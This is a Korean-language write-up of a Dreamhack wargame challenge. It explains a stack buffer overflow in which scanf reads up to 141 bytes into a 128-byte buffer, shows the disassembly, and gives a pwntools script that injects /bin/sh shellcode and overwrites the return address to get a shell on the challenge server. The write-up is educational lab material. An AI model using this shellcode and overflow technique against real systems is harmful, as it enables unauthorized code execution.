# [basic_exploitation_000](https://dreamhack.io/wargame/challenges/2/) 

 문제 파일의 코드는 다음과 같다. 주석은 코드의 해석들 위하여 본인이 직접 작성한 것이다.

```C
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>


void alarm_handler() {
    puts("TIME OUT");
    exit(-1);
}


void initialize() {
    setvbuf(stdin, NULL, _IONBF, 0); // 표준 입력에서 버퍼를 사용하지 않는다.버퍼를 지나지 않고 요청 즉시 작업이 진행된다. 
    setvbuf(stdout, NULL, _IONBF, 0); // 표준 출력에서 버퍼를 사용하지 않는다. 버퍼를 지나지 않고 요청 즉시 작업이 진행된다.

    signal(SIGALRM, alarm_handler); // SIGALRM이 발생하면 alarm_handler를 실행한다.
    alarm(30);//30초 후에 SIGALRM을 발생시킴.
}


int main(int argc, char *argv[]) {

    char buf[0x80];

    initialize();
    
    printf("buf = (%p)\n", buf); //buf의 주소 값을 출력
    scanf("%141s", buf);

    return 0;
}
```

## Exploit strategy
 유심히 봐야할 코드는 scanf("%141s", buf); 이다. buf의 크기는 0x80 = 128 byte이므로 scanf를 통하여 buf의 크기보다 더 많은 양의 데이터를 입력할 수 있다. 이를 이용하여 스택 버퍼 오버 플로우를 발생시키면 된다. pwndbg를 통하여 주어진 바이너리 파일의 main함수를 disassemble하여 살펴보자. 
 
```assembly 
   0x080485d9 <+0>:     push   ebp
   0x080485da <+1>:     mov    ebp,esp
   0x080485dc <+3>:     add    esp,0xffffff80
   0x080485df <+6>:     call   0x8048592 <initialize>
   0x080485e4 <+11>:    lea    eax,[ebp-0x80]
   0x080485e7 <+14>:    push   eax
   0x080485e8 <+15>:    push   0x8048699
   0x080485ed <+20>:    call   0x80483f0 <printf@plt>
   0x080485f2 <+25>:    add    esp,0x8
   0x080485f5 <+28>:    lea    eax,[ebp-0x80] // 오버플로우를 발생시킬 버퍼는 ebp-0x80에 위치함. 
   0x080485f8 <+31>:    push   eax
   0x080485f9 <+32>:    push   0x80486a5
   0x080485fe <+37>:    call   0x8048460 <__isoc99_scanf@plt>
   0x08048603 <+42>:    add    esp,0x8
   0x08048606 <+45>:    mov    eax,0x0
   0x0804860b <+50>:    leave
   0x0804860c <+51>:    ret
```

lea eax,[ebp-0x80]를 보면 오버플로우를 발생시킬 버퍼는 ebp-0x80에 위치함을 알 수 있다. 스택 프레임의 구조를 떠올려보자. ebp에는 SFP가 저장되므로 ebp+0x4(공격 대상 컴퓨터는 32bit이므로 포인터 크기는 4바이트이기 때문이다.)에 return address가 저장될 것임을 알 수 있다. 그런데 return address에 shell code를 넣을 수는 없다. 우리가 사용할 쉘코드는 26바이트이기 때문이다.(scanf는 \x09, \x0a, \x0b, \x0c, \x0d, \x20를 읽지 못하는데 25byte인 일반적인 shell code는 \x0b를 포함하므로 사용할 수 없다.) 따라서 return address에 buf의 주소를 넣고 buf안에 shell code를 넣어 shell code를 실행시킬 것이다.이제 Exploit script를 작성해보자. 

## Exploit script

```python
# importing pwntools
from pwn import* 

# 원격서버를 대상으로 실제로 공격하므로 remote함수를 사용한다. 매개변수는 각각 호스트와 포트넘버이다.
p = remote('host1.dreamhack.games',21920) 

#공격 대상 아키텍쳐는 x86
context.arch = 'i386' 

#buf의 주소 값을 담는 작업
p.recvuntil('buf = (') #  주소 값을 따로 저장하기위해 'buf = (' 까지만 받는다.
buf_addr = int(p.recv(10),16) # 문자열로 받은 주소 값을 16진수 정수로 변환하여 저장
p.recvline() # 남은 ")\n" 처리

#payload 작성
payload = b"\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x31\xc9\x31\xd2\xb0\x08\x40\x40\x40\xcd\x80" # 버퍼에 담을 26byte shell code
payload += b"\x90"*(132-26) # ebp+0x3까지 담을 더미 값 
payload += p32(buf_addr) # return address에 들어갈 buf의 주소 값을 32bit packing(little endian의 byte 배열로 변경)

#payload+'\n'을 전송
p.sendline(payload) 

#셸을 획득했으므로 interactive 함수 사용
p.interactive()
```


